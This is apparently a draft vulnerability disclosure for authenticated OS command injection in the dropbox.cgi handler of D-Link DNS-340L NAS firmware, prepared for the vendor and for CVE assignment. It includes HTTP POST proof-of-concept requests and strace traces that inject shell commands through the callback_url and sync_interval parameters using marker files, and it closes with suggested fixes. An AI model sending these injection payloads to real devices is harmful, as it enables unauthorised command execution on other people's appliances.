# Vulnerability Submission: D-Link DNS-340L dropbox.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-008 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-340L ShareCenter |
| Confirmed Firmware Versions | DNS-340L REVA 1.01B04 |
| Related Runtime Evidence | DNS-320L REVA 1.10B03 and DNS-327L REVA 1.10B02 also pass attacker-controlled Dropbox values to `dropnasctl` argument vectors, but this draft's primary shell-injection claim is limited to DNS-340L's directly observed `/bin/sh -c` templates. |
| Affected Binary | cgi/backup_mgr/dropbox.cgi |
| Web Endpoint | /cgi-bin/dropbox.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-340L 1.01B04: e11a4060d7042446b3cf36e4bb8bbd0b6f6b47e0 |

## Description

The `dropbox.cgi` CGI handler implements Dropbox backup/sync management. In DNS-340L REVA 1.01B04, authenticated Dropbox management branches concatenate POST parameters into shell commands passed to `dropnasctl`, including:

```text
dropnasctl --getaccessurl  <callback_url> > /dev/null
dropnasctl --setdownperiod  <sync_interval> > /dev/null
```

These commands are executed through `/bin/sh -c`. Because `callback_url` and `sync_interval` are not shell-metacharacter neutralized, an authenticated web attacker can inject shell metacharacters and execute arbitrary commands as the CGI process user.

The vulnerable paths are reachable from the authenticated Dropbox UI. `dropbox.js` sends POST requests to `/cgi-bin/dropbox.cgi` for Dropbox access URL and interval configuration actions.

## Impact

Successful exploitation allows authenticated remote command execution on the NAS appliance through the Dropbox backup/sync management workflow. The attacker can run arbitrary shell commands, alter backup configuration, install or remove files, or disrupt NAS services.

This report is limited to `dropnasctl` shell command paths confirmed with marker files and qemu strace. `cgi_Dropbox_set_folder` was also tested; the focused verifier did not create marker files for that branch on DNS-340L, so it is not claimed here.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/dropbox.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_Dropbox_get_access_url&callback_url=http://127.0.0.1/cb;touch /tmp/DLINK_CMD_008_callback.hit;#
```

```http
POST /cgi-bin/dropbox.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_Dropbox_set_interval&sync_interval=3600;touch /tmp/DLINK_CMD_008_interval.hit;#
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_dropbox_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/dropbox_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/dropbox_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/dropbox_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/dropbox_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled exec traces |
|----------|-------------|-------------|-------------------------|
| DNS-320L 1.10B03 | b98fff5ad3bc8001de0d32f576aba75e98c97db1 | 0 | 6 |
| DNS-327L 1.10B02 | 2629baee32d66caac2429b1c9b60396dcb065b12 | 0 | 6 |
| DNS-340L 1.01B04 | e11a4060d7042446b3cf36e4bb8bbd0b6f6b47e0 | 3 | 4 |

Representative DNS-340L qemu strace evidence:

`callback_url` semicolon injection:

```text
execve("/bin/sh",{"sh","-c","dropnasctl --getaccessurl  http://127.0.0.1/cb;touch /tmp/FIRMREC_DNS340L_101B04_DROPBOX_20260526_callback.hit;# > /dev/null",NULL})
```

`callback_url` command substitution:

```text
execve("/bin/sh",{"sh","-c","dropnasctl --getaccessurl  http://127.0.0.1/cb$(touch /tmp/FIRMREC_DNS340L_101B04_DROPBOX_20260526_callback_cmdsub.hit) > /dev/null",NULL})
```

`sync_interval` semicolon injection:

```text
execve("/bin/sh",{"sh","-c","dropnasctl --setdownperiod  3600;touch /tmp/FIRMREC_DNS340L_101B04_DROPBOX_20260526_interval.hit;# > /dev/null",NULL})
```

The verifier created marker files in the temporary DNS-340L qemu sysroot for the above cases.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `dropbox.cgi` command injection through `dropnasctl`, `callback_url`, or `sync_interval`.

NVD API checks:

| Query | Result |
|-------|--------|
| `dropbox.cgi` | 0 CVE records |
| `D-Link dropbox.cgi command injection` | 0 CVE records |
| `dropnasctl D-Link` | 0 CVE records |
| `cgi_Dropbox_get_access_url` | 0 CVE records |
| `cgi_Dropbox_set_interval` | 0 CVE records |
| `DNS-340L dropbox.cgi` | 0 CVE records |

Manual web search terms also checked:

```text
"dropbox.cgi" "D-Link" "command injection"
"dropnasctl" "D-Link" "command injection"
"cgi_Dropbox_get_access_url"
"cgi_Dropbox_set_interval"
"dropnasctl --getaccessurl"
"dropnasctl --setdownperiod"
```

Broader D-Link NAS command-injection searches return known same-family prior art for other endpoints. Those records are relevant prior art but are not direct duplicates of the verified `dropbox.cgi` / `dropnasctl` command path.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based command construction with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat callback URLs and interval values as structured values, not shell fragments.
3. Enforce strict server-side validation for URL schemes/hosts and numeric interval ranges.
4. Reject shell metacharacters, command substitutions, quoting characters, separators, and malformed values before launching Dropbox management actions.
5. Add server-side authorization and CSRF protections for Dropbox backup/sync management actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
